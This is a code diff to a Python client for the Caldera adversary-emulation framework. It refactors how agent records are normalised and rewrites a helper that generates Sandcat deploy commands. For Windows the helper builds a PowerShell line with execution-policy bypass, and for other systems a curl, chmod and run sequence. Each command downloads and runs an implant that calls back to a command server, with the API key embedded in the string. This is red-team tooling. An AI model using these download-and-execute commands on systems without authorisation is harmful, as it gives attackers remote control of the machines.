@@ -65,29 +65,65 @@ class CalderaClient:
     def list_agents(self):
         return self._request("GET", "/api/v2/agents")
 
-    def get_online_agents(self):
+    def _normalise_bool(self, value):
+        if isinstance(value, bool):
+            return value
+        if isinstance(value, str):
+            return value.strip().lower() in {"true", "trusted", "yes", "1"}
+        return bool(value)
+
+    def _agent_is_alive(self, agent):
+        raw = agent.get("alive")
+        if raw is not None:
+            return self._normalise_bool(raw)
+        status = str(agent.get("status") or agent.get("state") or "").lower()
+        if status in {"dead", "offline", "untrusted"}:
+            return False
+        if status in {"alive", "online", "trusted", "running"}:
+            return True
+        return True
+
+    def _normalise_agent(self, agent):
+        trusted = self._normalise_bool(agent.get("trusted"))
+        host = agent.get("host") or agent.get("host_name") or agent.get("hostname") or "unknown"
+        last_seen = agent.get("last_seen") or agent.get("last_seen_time") or agent.get("last_seen_at")
+        ip = (
+            agent.get("host_ip_addrs")
+            or agent.get("host_ip")
+            or agent.get("ip")
+            or agent.get("address")
+            or ""
+        )
+        if isinstance(ip, list):
+            ip = ", ".join(str(item) for item in ip if item)
+
+        return {
+            "paw": agent.get("paw"),
+            "host": host,
+            "hostname": host,
+            "ip": ip,
+            "platform": agent.get("platform") or agent.get("os") or agent.get("architecture") or "unknown",
+            "group": agent.get("group"),
+            "last_seen": last_seen,
+            "trusted": trusted,
+            "alive": self._agent_is_alive(agent),
+            "status": "Online" if self._agent_is_alive(agent) else "Offline",
+        }
+
+    def get_agents_normalized(self):
         agents = self.list_agents()
 
         if isinstance(agents, dict):
             agents = agents.get("agents", [])
 
-        online = []
+        return [self._normalise_agent(agent) for agent in agents or []]
 
-        for agent in agents:
-            trusted = agent.get("trusted")
-            paw = agent.get("paw")
-            host = agent.get("host") or agent.get("host_name")
-
-            if trusted is True:
-                online.append({
-                    "paw": paw,
-                    "host": host,
-                    "platform": agent.get("platform"),
-                    "group": agent.get("group"),
-                    "last_seen": agent.get("last_seen")
-                })
-
-        return online
+    def get_online_agents(self):
+        return [
+            agent
+            for agent in self.get_agents_normalized()
+            if agent.get("trusted") and agent.get("alive") and agent.get("paw")
+        ]
 
     def list_operations(self):
         return self._request("GET", "/api/v2/operations")
@@ -202,16 +238,23 @@ class CalderaClient:
             return adv.get("adversaries", [])
         return adv
 
-    def generate_sandcat_command(self, kali_ip, group='red'):
+    def generate_sandcat_command(self, kali_ip=None, group='red', platform='windows'):
         """Return a simple deploy command string for Sandcat (informational).
         This is a best-effort helper and intentionally non-destructive.
         """
-        # This is an informational deploy command to assist users; it may need tailoring in real deployments.
+        server = kali_ip or self.base_url
+        key_part = f" -k {self.api_key}" if self.api_key else ""
+
+        if "win" in str(platform or "").lower():
+            return (
+                "powershell -ExecutionPolicy Bypass -NoProfile -Command "
+                f"\"iwr -UseBasicParsing {self.base_url}/file/download -OutFile sandcat.exe; "
+                f".\\sandcat.exe -server {server} -group {group}{key_part}\""
+            )
+
         return (
-            f"# Download and run Sandcat agent (example)\n"
-            f"curl -fsSL {self.base_url}/download/sandcat -o sandcat && chmod +x sandcat && \
-"
-            f"./sandcat --server {kali_ip} --group {group} --key {self.api_key}"
+            f"curl -fsSL {self.base_url}/file/download -o sandcat; "
+            f"chmod +x sandcat; ./sandcat -server {server} -group {group}{key_part}"
         )
 
     def get_adversary_list(self):
